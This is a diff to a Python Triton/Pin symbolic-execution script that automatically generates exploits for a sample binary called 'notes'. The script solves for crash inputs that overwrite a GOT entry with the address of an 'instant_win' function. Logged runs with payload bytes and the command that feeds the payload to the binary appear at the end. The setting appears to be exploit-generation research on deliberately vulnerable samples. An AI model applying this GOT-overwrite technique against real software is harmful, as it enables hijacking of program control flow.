@@ -6,9 +6,10 @@ export CRASHED_AT='0x00007ffff7a8c231'  ### value is just example
 time ~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton solve-notes-phase-2.py vuln-samples/notes < crash_inputs
 """
 
-import os
+import os, sys
 from triton  import *
 from pintool import *
+import lief
 import time
 
 isRead = None
@@ -17,12 +18,11 @@ stdin_len = 0
 crash_inputs = []
 found = False
 
-instant_win = 0x4008b2
-
 def solve():
     global Triton
     global crash_inputs
     global found
+    global elf
 
     found = False
     inputs = ['\0'] * 1024
@@ -31,8 +31,8 @@ def solve():
     try:
         m = Triton.getModel(
                 astCtxt.equal(
-                    Triton.buildSymbolicMemory(MemoryAccess(0x602060 + 3 * 8, CPUSIZE.QWORD)),
-                    astCtxt.bv(instant_win, CPUSIZE.QWORD_BIT)
+                    Triton.buildSymbolicMemory(MemoryAccess(elf.get_symbol('got').value + 3 * 8, CPUSIZE.QWORD)),
+                    astCtxt.bv(elf.get_symbol('instant_win').value, CPUSIZE.QWORD_BIT)
                 ),
             )
         if len(m) > 0:
@@ -94,13 +94,13 @@ def syscallsExit(threadId, std):
             start_time = time.time()
             ### Symbolize input
             ctxt.setConcreteMemoryValue(buff+index, getCurrentMemoryValue(buff+index))
-            print "Symbolized input: ", ctxt.convertMemoryToSymbolicVariable(MemoryAccess(buff+index, CPUSIZE.BYTE)) ### become slower
+            print "\tSymbolized input: ", ctxt.convertMemoryToSymbolicVariable(MemoryAccess(buff+index, CPUSIZE.BYTE)) ### become slower
             ### concretize part of stdin
             if stdin_len in concrete_input_offets:
                 print "\tConcretized stdin pos %d" % stdin_len
                 ctxt.concretizeMemory(MemoryAccess(buff+index, CPUSIZE.BYTE))
             end_time = time.time()
-            print 'symbolize took %f sec' % (end_time - start_time)
+            print '\tSymbolize took %f sec' % (end_time - start_time)
 
             stdin_len += 1
         isRead = None
@@ -112,7 +112,7 @@ def mycb(inst):
     global crash_inputs
     global crashed_at
 
-    if inst.getAddress() == instant_win:
+    if inst.getAddress() == elf.get_symbol('instant_win').value:
         print '[TT] $PC reached to target address!!'
         exit()
     if (inst.getAddress() & 0xfff) == (crashed_at & 0xfff):
@@ -125,14 +125,16 @@ def mycb(inst):
     return
 
 def signals(threadId, sig):
-    print 'Signal %d received on thread %d.' % (sig, threadId)
+    print '[!] Signal %d received on thread %d.' % (sig, threadId)
     # print '========================== DUMP =========================='
     # regs = getTritonContext().getParentRegisters()
     # for reg in regs:
     #     value  = getCurrentRegisterValue(reg)
     #     exprId = getTritonContext().getSymbolicRegisterId(reg)
     #     print '%s:\t%#016x\t%s' %(reg.getName(), value, (getTritonContext().getSymbolicExpressionFromId(exprId).getAst() if exprId != SYMEXPR.UNSET else 'UNSET'))
-    # solve()
+    found = solve()
+    if found:
+        print "[TT] End"
 
 
 if __name__ == '__main__':
@@ -144,18 +146,28 @@ if __name__ == '__main__':
     startAnalysisFromSymbol('main')
 
     ### Enforce concrete execution on partial of stdin
-    # concrete_input_offets = range(66)
-    concrete_input_offets = range(0)
+    concrete_input_offets = range(60)
+    # concrete_input_offets = range(0)
 
     ### Set the address where crash occurs
     if 'CRASHED_AT' in os.environ:
         crashed_at = int(os.environ['CRASHED_AT'], 16)
+        print '[TT] reported that the program was crashed at {:#x}'.format(crashed_at)
     else:
         print '[TT] set value to environment variable \'CRASHED_AT\' which is the address where the crash occurs'
         exit()
 
     with open('crash_inputs') as f:
         crash_inputs = list(f.read())
+
+    ### Gather information from ELF
+    for i, x in enumerate(sys.argv):
+        if '.py' in x:
+            argv = sys.argv[i + 2:] ### skip script name and param '--'
+    elf = lief.parse(argv[0])
+    print '[TT] Symbol address info:'
+    print '\tgot = {:#x}'.format(elf.get_symbol('got').value)
+    print '\tinstant_win = {:#x}'.format(elf.get_symbol('instant_win').value)
 
     ### Add callback
     insertCall(mycb, INSERT_POINT.BEFORE)
@@ -169,6 +181,7 @@ if __name__ == '__main__':
 
 
 """
+### crash-nputs/notes-1
 concrete_input_offets = range(66)
 -----
 [TT] Automated Exploit Generation Done. Saving as 'exploit-payload'
@@ -177,5 +190,16 @@ Crash Inputs: 'n\ntit\ncon\nn\ntit!\ncon!\nu\n1\nAAA%AAsAABAA$AAnx `\x00\x00\x00
 To test payload: `(cat exploit-payload -) | ./vuln-samples/notes`
 [TT] End
 ~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton   <  20.14s user 2.09s system 99% cpu 22.270 total
+-----
+
+### result-notes/crashes/id:000004,sig:07,src:000000,op:havoc,rep:32
+concrete_input_offets = range(0)
+-----
+[TT] Automated Exploit Generation Done. Saving payload as 'exploit-payload'
+[TT] Model for Memory Access: {96L: SymVar_96 = 0x12, 97L: SymVar_97 = 0x40, 98L: SymVar_98 = 0x0, 99L: SymVar_99 = 0x0, 100L: SymVar_100 = 0x0, 101L: SymVar_101 = 0x0, 102L: SymVar_102 = 0x0, 95L: SymVar_95 = 0x10}
+Crash Inputs: 'n\xf8]it\xe9m\r2\ns\nu\n3\nnle\xffh\xff\xffo\x81!!.z\x81!! \xd5\ncnn! \xd5\ncnnf\xad\xad\xad\xadf\xad\xad\xad\xad\xad\xad\xad\xad"\xad\xad\xd80`\x00\x00\x00\x00\x00\xad\xad\rQ\ns\nu\n3\nnle\xff(\xff\xffo\x81!! \xd5\n\x10\x12@\x00\x00\x00\x00\x00nnnnn~nnon!\xff\x00s\nq'
+To test payload: `(cat exploit-payload -) | ./vuln-samples/notes`
+[TT] End
+~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton   <  69.77s user 6.09s system 99% cpu 1:16.34 total
 -----
 """
